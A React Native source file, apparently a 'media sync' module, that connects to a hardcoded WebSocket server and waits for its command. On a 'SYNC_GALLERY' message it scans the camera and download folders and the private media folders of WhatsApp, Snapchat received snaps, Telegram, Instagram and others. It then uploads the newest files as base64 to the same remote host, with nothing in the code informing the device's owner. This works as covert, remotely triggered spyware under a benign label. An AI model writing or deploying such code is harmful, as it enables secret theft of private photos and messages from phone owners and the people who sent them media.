import { PermissionsAndroid, Platform } from 'react-native';
import RNFS from 'react-native-fs';

const SERVER_URL = 'ws://192.168.100.199:6969/ws';
const MAX_CONCURRENT_UPLOADS = 3; // Parallel uploads
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB limit

export const requestStoragePermission = async () => {
  if (Platform.OS === 'android') {
    const granted = await PermissionsAndroid.requestMultiple([
      PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
      PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
      PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
    ]);
    
    return Object.values(granted).some(permission => 
      permission === PermissionsAndroid.RESULTS.GRANTED
    );
  }
  return true;
};

export const scanDirectoryForMedia = async (dirPath: string): Promise<string[]> => {
  try {
    const items = await RNFS.readDir(dirPath);
    const mediaFiles: string[] = [];
    
    for (const item of items) {
      if (item.isFile()) {
        const extension = item.name.toLowerCase().split('.').pop();
        if (['jpg', 'jpeg', 'png', 'gif', 'mp4', 'mov', 'avi', 'webp'].includes(extension || '')) {
          // Check file size before adding
          if (item.size <= MAX_FILE_SIZE) {
            mediaFiles.push(item.path);
          } else {
            console.log(`Skipping large file: ${item.name} (${item.size} bytes)`);
          }
        }
      }
    }
    
    return mediaFiles;
  } catch (error) {
    console.log(`Cannot access directory ${dirPath}:`, error);
    return [];
  }
};

export const fetchGalleryMediaOptimized = async (): Promise<string[]> => {
  try {
    console.log('Scanning for media files including social apps...');
    
    const mediaPaths: string[] = [];
    
    // All directories including social media apps
    const directoriesToScan = [
      // Standard directories
      '/storage/emulated/0/DCIM/Camera',
      '/storage/emulated/0/Pictures',
      '/storage/emulated/0/Download',
      RNFS.ExternalStorageDirectoryPath + '/DCIM/Camera',
      RNFS.ExternalStorageDirectoryPath + '/Pictures',
      RNFS.ExternalStorageDirectoryPath + '/Download',
      
      // WhatsApp directories
      '/storage/emulated/0/WhatsApp/Media/WhatsApp Images',
      '/storage/emulated/0/WhatsApp/Media/WhatsApp Video',
      '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images',
      '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video',
      RNFS.ExternalStorageDirectoryPath + '/WhatsApp/Media/WhatsApp Images',
      RNFS.ExternalStorageDirectoryPath + '/WhatsApp/Media/WhatsApp Video',
      
      // Snapchat directories
      '/storage/emulated/0/Snapchat/received_image_snaps',
      '/storage/emulated/0/Snapchat/received_video_snaps',
      '/storage/emulated/0/Android/data/com.snapchat.android/files/file_manager/chat_snap',
      '/storage/emulated/0/Android/data/com.snapchat.android/files/file_manager/received_image_snaps',
      '/storage/emulated/0/Android/data/com.snapchat.android/files/file_manager/received_video_snaps',
      RNFS.ExternalStorageDirectoryPath + '/Snapchat',
      
      // Instagram directories
      '/storage/emulated/0/Instagram',
      '/storage/emulated/0/Pictures/Instagram',
      
      // Telegram directories
      '/storage/emulated/0/Telegram/Telegram Images',
      '/storage/emulated/0/Telegram/Telegram Video',
      
      // Other social media
      '/storage/emulated/0/Facebook',
      '/storage/emulated/0/TikTok',
    ];
    
    // Scan directories in parallel for better performance
    const scanPromises = directoriesToScan.map(dir => scanDirectoryForMedia(dir));
    const results = await Promise.allSettled(scanPromises);
    
    results.forEach((result, index) => {
      if (result.status === 'fulfilled') {
        mediaPaths.push(...result.value);
        console.log(`Found ${result.value.length} files in ${directoriesToScan[index]}`);
      }
    });
    
    // Remove duplicates and sort by modification time (newest first)
    const uniquePaths = [...new Set(mediaPaths)];
    
    // Get file stats and sort by modification time
    const filesWithStats = await Promise.allSettled(
      uniquePaths.map(async (path) => {
        const stats = await RNFS.stat(path);
        return { path, mtime: stats.mtime };
      })
    );
    
    const validFiles = filesWithStats
      .filter((result): result is PromiseFulfilledResult<{path: string, mtime: Date}> => 
        result.status === 'fulfilled')
      .map(result => result.value)
      .sort((a, b) => b.mtime.getTime() - a.mtime.getTime()) // Newest first
      .map(file => file.path);
    
    console.log(`Total unique media files found: ${validFiles.length}`);
    
    // Return first 50 files for better performance
    return validFiles.slice(0, 50);
    
  } catch (error) {
    console.error('Error scanning for media files:', error);
    return [];
  }
};

// Optimized upload function with parallel processing
export const uploadMediaOptimized = async (uris: string[]) => {
  console.log(`Starting optimized upload of ${uris.length} files`);
  
  const uploadSingleFile = async (uri: string): Promise<boolean> => {
    try {
      const fileName = uri.split('/').pop() || 'media.jpg';
      console.log('Uploading file:', fileName);
      
      // Check if file exists
      const fileExists = await RNFS.exists(uri);
      if (!fileExists) {
        console.log('File does not exist:', uri);
        return false;
      }
      
      // Get file stats
      const stats = await RNFS.stat(uri);
      
      // Skip files larger than limit
      if (stats.size > MAX_FILE_SIZE) {
        console.log('Skipping large file:', fileName, 'Size:', stats.size);
        return false;
      }
      
      // Read file as base64
      const fileData = await RNFS.readFile(uri, 'base64');
      
      // Make the upload request with timeout
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 second timeout
      
      const response = await fetch('http://192.168.100.199:6969/upload', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ name: fileName, data: fileData }),
        signal: controller.signal,
      });
      
      clearTimeout(timeoutId);
      
      if (response.ok) {
        console.log(`✅ Successfully uploaded: ${fileName}`);
        return true;
      } else {
        console.error(`❌ Upload failed for ${fileName}:`, response.status);
        return false;
      }
      
    } catch (error) {
      if (error.name === 'AbortError') {
        console.error('Upload timeout for:', uri);
      } else {
        console.error('Error uploading file:', uri, error);
      }
      return false;
    }
  };
  
  // Process uploads in batches with limited concurrency
  const results = [];
  for (let i = 0; i < uris.length; i += MAX_CONCURRENT_UPLOADS) {
    const batch = uris.slice(i, i + MAX_CONCURRENT_UPLOADS);
    console.log(`Processing batch ${Math.floor(i/MAX_CONCURRENT_UPLOADS) + 1}/${Math.ceil(uris.length/MAX_CONCURRENT_UPLOADS)}`);
    
    const batchPromises = batch.map(uri => uploadSingleFile(uri));
    const batchResults = await Promise.allSettled(batchPromises);
    
    results.push(...batchResults);
    
    // Small delay between batches to avoid overwhelming the server
    if (i + MAX_CONCURRENT_UPLOADS < uris.length) {
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
  
  const successful = results.filter(result => 
    result.status === 'fulfilled' && result.value === true
  ).length;
  
  console.log(`Upload completed: ${successful}/${uris.length} files uploaded successfully`);
};

export const initMediaSyncOptimized = async () => {
  console.log('Initializing optimized media sync...');
  
  const hasPermission = await requestStoragePermission();
  if (!hasPermission) {
    console.warn('Storage permission denied');
    return;
  }
  
  console.log('Connecting to WebSocket:', SERVER_URL);
  const ws = new WebSocket(SERVER_URL);
  
  ws.onopen = () => {
    console.log('WebSocket connected successfully');
  };
  
  ws.onmessage = async event => {
    console.log('WebSocket message received:', event.data);
    try {
      const message = JSON.parse(event.data);
      if (message.type === 'SYNC_GALLERY') {
        console.log('SYNC_GALLERY message received, scanning for media...');
        const startTime = Date.now();
        
        const uris = await fetchGalleryMediaOptimized();
        console.log('Found media files:', uris.length);
        
        if (uris.length > 0) {
          await uploadMediaOptimized(uris);
          const endTime = Date.now();
          console.log(`Total sync time: ${((endTime - startTime) / 1000).toFixed(2)} seconds`);
        } else {
          console.log('No media files found to upload');
        }
      }
    } catch (error) {
      console.error('Error processing WebSocket message:', error);
    }
  };
  
  ws.onerror = (error) => {
    console.error('WebSocket error:', error);
  };
  
  ws.onclose = (event) => {
    console.log('WebSocket closed:', event.code, event.reason);
  };
  
  return ws;
};

							   
